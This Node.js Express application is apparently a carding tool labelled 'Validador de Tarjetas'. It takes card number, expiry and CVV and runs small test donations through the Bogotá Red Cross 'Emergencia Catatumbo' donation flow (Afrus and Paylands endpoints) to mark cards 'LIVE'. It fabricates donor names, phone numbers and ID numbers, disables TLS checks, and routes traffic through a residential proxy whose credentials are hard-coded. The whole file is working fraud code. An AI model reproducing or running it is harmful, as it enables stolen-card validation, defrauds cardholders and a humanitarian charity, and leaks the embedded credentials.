const express = require('express');
const axios = require('axios');
const https = require('https');
const path = require('path');
const faker = require('faker');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();

// Configuración de vistas y middlewares
app.set('view engine', 'hbs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

// Middleware para ignorar verificación SSL (SOLO DESARROLLO)
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Configuración del proxy agent Smartproxy (sticky 2 minutos)
const proxyUrl = 'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30001';
const proxyAgent = new HttpsProxyAgent(proxyUrl);

// Validar proxy al iniciar el servidor
const url = 'https://ip.smartproxy.com/json';
axios
  .get(url, {
    httpsAgent: proxyAgent,
  })
  .then((response) => {
    console.log(response.data);
  });

// Utilidad para loguear en consola y en logs
function addLog(logs, msg) {
  logs.push(msg);
  console.log(msg);
}

// Utilidades para cookies y datos aleatorios
function extractCookies(setCookieHeaders) {
  const cookies = {};
  if (!setCookieHeaders) return cookies;
  setCookieHeaders.forEach(cookieStr => {
    const [cookie] = cookieStr.split(';');
    const [key, value] = cookie.split('=');
    cookies[key.trim()] = value.trim();
  });
  return cookies;
}

function randomAmount() {
  const amounts = [5000, 6000, 7000, 8000];
  return amounts[Math.floor(Math.random() * amounts.length)];
}

function randomPhone() {
  // Rango colombiano: 3112500000 - 3222500000
  const start = 3112500000;
  const end = 3222500000;
  return '+57' + Math.floor(Math.random() * (end - start + 1) + start);
}

function randomCC() {
  // Rango: 1191000000 - 1193000000
  return String(Math.floor(Math.random() * (1193000000 - 1191000000 + 1) + 1191000000));
}

function generateFakeUser() {
  faker.locale = 'es';
  const firstName = faker.name.firstName();
  const lastName = faker.name.lastName();
  const emailUser = (Math.random() > 0.5 ? firstName : lastName).toLowerCase().replace(/[^a-z]/g, '') +
    Math.floor(Math.random() * 10000);
  const email = `${emailUser}@gmail.com`;
  return { firstName, lastName, email };
}

// Página principal
app.get('/', (req, res) => {
  res.render('index', {
    title: 'Validador de Tarjetas',
    results: null,
    error: null,
    logs: ['Sistema listo. Ingrese los datos de la tarjeta.']
  });
});

// Procesar tarjeta
app.post('/validate', async (req, res) => {
  const cardData = req.body.card;
  const logs = [];
  let cookies = {};
  let paymentToken = '';
  let uuid = '';
  let cardBrand = '';
  let cardBrandDesc = '';
  let cardBank = '';
  let amount = 0;

  try {
    addLog(logs, '🔵 Iniciando validación...');
    const [number, month, year, cvv] = cardData.split('|');
    addLog(logs, `📦 Datos recibidos: ${number}|${month}|${year}|${cvv}`);

    // Validación básica
    if (!number || !month || !year || !cvv) {
      throw new Error('Formato de tarjeta incorrecto. Use: NUMERO|MES|AÑO|CVV');
    }

    // Endpoint 1: Pixel Tracking
    addLog(logs, '🟡 Enviando a endpoint 1 (Pixel)...');
    await sendPixelRequest(logs);

    // OMITIDO: Endpoint 2 OPTIONS Preflight

    // Endpoint 3: GET Form Data (y extraer cookies)
    addLog(logs, '🟡 Enviando a endpoint 3 (GET Form)...');
    const getFormResp = await getFormDataWithCookies(logs);
    cookies = getFormResp.cookies;
    addLog(logs, '🍪 Cookies obtenidas: ' + JSON.stringify(cookies));

    // Generar datos ficticios
    const fakeUser = generateFakeUser();
    amount = randomAmount();
    const phone = randomPhone();

    // Endpoint 4: leadDonationStart
    addLog(logs, '🟡 Enviando a endpoint 4 (leadDonationStart)...');
    const leadDonationResp = await leadDonationStart({
      cookies,
      fakeUser,
      amount,
      phone
    }, logs);
    cookies = leadDonationResp.cookies; // Actualizar cookies
    addLog(logs, '🍪 Cookies actualizadas (endpoint 4): ' + JSON.stringify(cookies));
    addLog(logs, '🔵 Respuesta endpoint 4: ' + JSON.stringify(leadDonationResp.data));

    // Endpoint 5: donation (token)
    addLog(logs, '🟡 Enviando a endpoint 5 (donation/token)...');
    const donationTokenResp = await donationToken({
      cookies,
      fakeUser,
      amount,
      phone
    }, logs);
    cookies = donationTokenResp.cookies; // Actualizar cookies
    paymentToken = donationTokenResp.token;
    addLog(logs, '🔵 Respuesta endpoint 5: ' + JSON.stringify(donationTokenResp.data));

    // Endpoint 6: Guardar tarjeta en Paylands
    addLog(logs, '🟡 Enviando a endpoint 6 (Paylands Card Save)...');
    const paylandsResp = await paylandsCardSave({
      token: paymentToken,
      number,
      month,
      year,
      cvv
    }, logs);
    uuid = paylandsResp.uuid;
    cardBrand = paylandsResp.brand;
    cardBrandDesc = paylandsResp.brand_description;
    cardBank = paylandsResp.bank;
    addLog(logs, '🔵 Respuesta endpoint 6: ' + JSON.stringify(paylandsResp));

    // Endpoint 7: donation final (con tarjeta)
    addLog(logs, '🟡 Enviando a endpoint 7 (donation final)...');
    const donationFinalResp = await donationFinal({
      cookies,
      fakeUser,
      amount,
      phone,
      uuid
    }, logs);
    addLog(logs, '🔵 Respuesta endpoint 7: ' + JSON.stringify(donationFinalResp));

    addLog(logs, '✅ Validación completada con éxito');

    res.render('index', {
      title: 'Resultado de Validación',
      results: {
        status: 'LIVE',
        card: `${number.substring(0, 4)}**** **** ****`,
        bank: cardBank || detectBank(number),
        type: cardBrand || detectCardType(number),
        brand_description: cardBrandDesc || '',
        uuid: uuid || '',
        amount // Mostrar el monto cobrado
      },
      error: null,
      logs: logs
    });

  } catch (error) {
    let errorMsg = error.message;
    if (error.response && error.response.data && error.response.data.message) {
      errorMsg = error.response.data.message;
    }
    addLog(logs, `🔴 Error: ${errorMsg}`);
    res.render('index', {
      title: 'Error en Validación',
      results: null,
      error: errorMsg,
      logs: logs
    });
  }
});

// Funciones para los endpoints

async function sendPixelRequest(logs) {
  try {
    const response = await axios.post(
      'https://donar.cruzrojabogota.org.co/wp-admin/admin-ajax.php',
      new URLSearchParams({
        action: 'pys_api_event',
        ajax_event: 'ff98136bee',
        'data[_fbp]': 'fb.1.1744598574627.1816376187',
        'data[event_url]': 'donar.cruzrojabogota.org.co/catatumbo/',
        'data[page_title]': 'Emergencia Catatumbo',
        'data[plugin]': 'PixelYourSite',
        'data[post_id]': '7154',
        'data[post_type]': 'page',
        'data[user_role]': 'guest',
        edd_order: '',
        event: 'PageView',
        eventID: '7c707070-a0c8-415f-8a32-e8e0ae981724',
        'ids[]': '936281707247211',
        pixel: 'facebook',
        url: 'https://donar.cruzrojabogota.org.co/catatumbo/',
        woo_order: ''
      }),
      {
        headers: {
          'X-Requested-With': 'XMLHttpRequest',
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 Pixel Status: ${response.status}`);
  } catch (error) {
    addLog(logs, `🔴 Pixel Error: ${error.message}`);
    throw error;
  }
}

// OMITIDO: sendOptionsRequest

async function getFormDataWithCookies(logs) {
  try {
    const response = await axios.get(
      'https://my.afrus.org/api/form/2d90b31c-4ac3-4bd8-9656-0de01743902f',
      {
        headers: {
          'Accept': 'application/json'
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 GET Form Status: ${response.status}`);
    addLog(logs, `📄 Response: ${JSON.stringify(response.data)}`);
    // Extraer cookies
    const cookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies };
  } catch (error) {
    addLog(logs, `🔴 GET Form Error: ${error.message}`);
    throw error;
  }
}

async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs) {
  try {
    const response = await axios.post(
      'https://my.afrus.org/api/leadDonationStart',
      {
        is_donation: true,
        form_id: 9164,
        treatment: null,
        campaign_id: 5059,
        amount: amount + '.00',
        currency_id: 36,
        country_id: 49,
        gateway_id: 8,
        language_code: 'ES',
        organization_id: 18,
        first_name: fakeUser.firstName,
        last_name: fakeUser.lastName,
        email: fakeUser.email,
        phone: phone,
        gender: '',
        born_date: null,
        state: '',
        city: '',
        street: '',
        street_number: '',
        zip_code: '',
        rest_address: '',
        rest_address2: '',
        countryPhone: 'CO',
        type: 1,
        url_landing: 'https://donar.cruzrojabogota.org.co/',
        unomi_metadata: {},
        organization: '',
        custom_fields: { ciudad: 'cucuta' },
        metadata: {
          gateway: { name: 'Bakery' },
          amount: amount,
          is_subscription: false,
          form: { name: 'Emergencia Catatumbo' },
          campaign: { name: 'Crisis Catatumbo' }
        }
      },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=UTF-8',
          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 leadDonationStart Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    return { data: response.data, cookies: { ...cookies, ...newCookies } };
  } catch (error) {
    addLog(logs, `🔴 leadDonationStart Error: ${error.message}`);
    throw error;
  }
}

async function donationToken({ cookies, fakeUser, amount, phone }, logs) {
  try {
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      {
        treatment: null,
        form_id: 9164,
        country_id: 49,
        language_code: 'ES',
        url_landing: 'https://donar.cruzrojabogota.org.co/',
        amount: amount + '.00',
        is_subscription: false,
        gateway_id: 8,
        campaign_id: 5059,
        organization_id: 18,
        first_name: fakeUser.firstName,
        last_name: fakeUser.lastName,
        email: fakeUser.email,
        phone: phone,
        currency_id: 36,
        state: '',
        city: '',
        gender: '',
        born_date: null,
        street: '',
        street_number: '',
        zip_code: '',
        rest_address: '',
        rest_address2: '',
        countryPhone: 'CO',
        type: 1,
        identification_type: null,
        id_transaction: null,
        custom_fields: { ciudad: 'cucuta' },
        payment_method: 'card',
        unomi_metadata: {},
        organization: '',
        frequency_id: 1,
        fundraising_campaign_id: null,
        terms_accepted: true,
        terms2_accepted: true,
        private: false,
        requestToken: true
      },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=UTF-8',
          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation/token Status: ${response.status}`);
    const newCookies = extractCookies(response.headers['set-cookie'] || []);
    const token = response.data.token;
    addLog(logs, `🔑 Token obtenido: ${token}`);
    return { data: response.data, cookies: { ...cookies, ...newCookies }, token };
  } catch (error) {
    addLog(logs, `🔴 donation/token Error: ${error.message}`);
    throw error;
  }
}

async function paylandsCardSave({ token, number, month, year, cvv }, logs) {
  try {
    const response = await axios.post(
      'https://api.paylands.com/v1/cards/save/frame',
      {
        token: token,
        card_pan: number,
        card_expiry_month: month,
        card_expiry_year: year.substring(2, 4), // Solo los dos últimos dígitos
        card_cvv: cvv,
        url_post: ''
      },
      {
        headers: {
          'X-Requested-With': 'XMLHttpRequest',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
          'Accept': '*/*',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 Paylands Card Save Status: ${response.status}`);
    addLog(logs, `💳 Brand: ${response.data.Source.brand}, Desc: ${response.data.Source.brand_description}, Bank: ${response.data.Source.bank}`);
    return {
      uuid: response.data.Source.uuid,
      brand: response.data.Source.brand,
      brand_description: response.data.Source.brand_description,
      bank: response.data.Source.bank
    };
  } catch (error) {
    addLog(logs, `🔴 Paylands Card Save Error: ${error.message}`);
    throw error;
  }
}

async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs) {
  try {
    const response = await axios.post(
      'https://my.afrus.org/api/donation',
      {
        treatment: null,
        form_id: 9164,
        country_id: 49,
        language_code: 'ES',
        url_landing: 'https://donar.cruzrojabogota.org.co/',
        amount: amount + '.00',
        is_subscription: false,
        gateway_id: 8,
        campaign_id: 5059,
        organization_id: 18,
        first_name: fakeUser.firstName,
        last_name: fakeUser.lastName,
        email: fakeUser.email,
        phone: phone,
        currency_id: 36,
        state: '',
        city: '',
        gender: '',
        born_date: null,
        street: '',
        street_number: '',
        zip_code: '',
        rest_address: '',
        rest_address2: '',
        countryPhone: 'CO',
        type: 1,
        identification_type: 4,
        identification: randomCC(),
        id_transaction: null,
        custom_fields: { ciudad: 'cucuta' },
        payment_method: 'card',
        unomi_metadata: {},
        organization: '',
        frequency_id: 1,
        fundraising_campaign_id: null,
        terms_accepted: true,
        terms2_accepted: true,
        private: false,
        payment_token: uuid
      },
      {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=UTF-8',
          'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
        },
        httpsAgent: proxyAgent
      }
    );
    addLog(logs, `🟢 donation final Status: ${response.status}`);
    if (response.data.code) {
      addLog(logs, `🔴 Resultado: code=${response.data.code}, message=${response.data.message}, reference=${response.data.reference || ''}`);
    } else {
      addLog(logs, `🟢 Resultado: ${JSON.stringify(response.data)}`);
    }
    return response.data;
  } catch (error) {
    if (error.response && error.response.data) {
      addLog(logs, `🔴 Resultado: code=${error.response.data.code}, message=${error.response.data.message}, reference=${error.response.data.reference || ''}`);
    } else {
      addLog(logs, `🔴 donation final Error: ${error.message}`);
    }
    throw error;
  }
}

// Funciones auxiliares
function detectBank(number) {
  const firstDigits = number.substring(0, 4);
  // Lógica para detectar banco según BIN
  return 'Scotiabank'; // Ejemplo
}

function detectCardType(number) {
  // Lógica para detectar tipo de tarjeta
  return /^5[1-5]/.test(number) ? 'Mastercard' : 'Visa'; // Ejemplo
}

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});